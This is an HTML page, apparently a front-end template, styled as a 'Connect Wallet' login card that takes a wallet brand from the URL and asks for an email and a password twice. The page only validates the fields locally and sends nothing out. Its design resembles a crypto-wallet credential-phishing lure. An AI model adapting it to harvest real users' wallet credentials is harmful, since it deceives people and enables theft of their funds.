<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Email Login</title>

    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: "Montserrat", sans-serif;
        background: linear-gradient(
          to bottom,
          #003125,
          #00816c,
          #00bd8e,
          #003125
        );
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        color: #bfffe9;
      }

      .email-card {
        background: #003228;
        width: 90%;
        max-width: 380px;
        padding: 25px;
        border-radius: 12px;
        text-align: center;
        box-shadow: 0 0 20px rgba(0, 255, 200, 0.25);
      }

      .email-card img {
        width: 90px;
        height: 90px;
        border-radius: 50%;
        margin-bottom: 15px;
      }

      .email-card h2 {
        margin: 10px 0 20px;
        font-size: 24px;
        font-weight: bold;
        color: #bfffe9;
      }

      .email-card input {
        width: 92%;
        padding: 12px;
        margin: 10px 0;
        border-radius: 8px;
        background: transparent;
        border: 2px solid #00e6c3;
        color: #bfffe9;
        font-size: 15px;
      }

      .email-card input::placeholder {
        color: #bfffe9;
      }

      .email-card button {
        width: 100%;
        padding: 12px;
        margin-top: 15px;
        border: none;
        border-radius: 10px;
        background: #00e6c3;
        color: black;
        font-size: 18px;
        font-weight: bold;
        cursor: pointer;
      }

      .email-card button:hover {
        background: #11ffee;
        box-shadow: 0 0 12px #11ffee;
      }

      .bottom-box {
        display: flex;
        flex-direction: column;
      }

      .check-row {
        display: flex;
        align-items: center;
        gap: 14px;
        font-size: 15px;
        color: #bfffe9;
      }

      .check-row input {
        width: 14px;
        height: 14px;
        cursor: pointer;
      }

      /* POPUP */
      #popup {
        display: none;
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: #00483a;
        padding: 22px;
        width: 260px;
        border-radius: 12px;
        text-align: center;
        border: 2px solid #00e6c3;
        box-shadow: 0 0 15px #00e6c3;
        z-index: 9999;
      }

      #popup button {
        margin-top: 12px;
        padding: 10px 22px;
        border: none;
        border-radius: 10px;
        background: #00e6c3;
        color: black;
        font-weight: bold;
        cursor: pointer;
      }
    </style>
  </head>

  <body>
    <div class="email-card">
      <img id="walletLogo" src="" />
      <h2 id="walletName">Wallet</h2>

      <input type="email" id="email" placeholder="Enter Email" />
      <input type="password" id="pass1" placeholder="Enter Password" />
      <input type="password" id="pass2" placeholder="Confirm Password" />

      <div class="bottom-box">
        <label class="check-row">
          <input type="checkbox" id="confirmCheck" />
          <span>Are you sure you entered correctly?</span>
        </label>
      </div>

      <button onclick="validateForm()">Connect Wallet</button>
    </div>

    <!-- POPUP -->
    <div id="popup">
      <p id="popupMsg">Please fill out this field.</p>
      <button onclick="closePopup()">OK</button>
    </div>

    <script>
      const params = new URLSearchParams(window.location.search);
      const wallet = params.get("wallet");

      document.getElementById("walletName").innerText = wallet;

      let imgName = wallet.toLowerCase().replace(/\s+/g, "") + ".webp";
      document.getElementById("walletLogo").src = "wallet-icons/" + imgName;

      function validateForm() {
        const email = document.getElementById("email").value.trim();
        const p1 = document.getElementById("pass1").value.trim();
        const p2 = document.getElementById("pass2").value.trim();
        const check = document.getElementById("confirmCheck").checked;

        if (email === "") return showPopup("Please enter your email.");
        if (p1 === "") return showPopup("Please enter your password.");
        if (p2 === "") return showPopup("Please confirm your password.");
        if (p1 !== p2) return showPopup("Passwords do not match.");
        if (!check) return showPopup("Please tick the confirmation checkbox.");

        showPopup("Wallet connected successfully!");
      }

      function showPopup(msg) {
        document.getElementById("popupMsg").innerText = msg;
        document.getElementById("popup").style.display = "block";
      }

      function closePopup() {
        document.getElementById("popup").style.display = "none";
      }
    </script>
  </body>
</html>
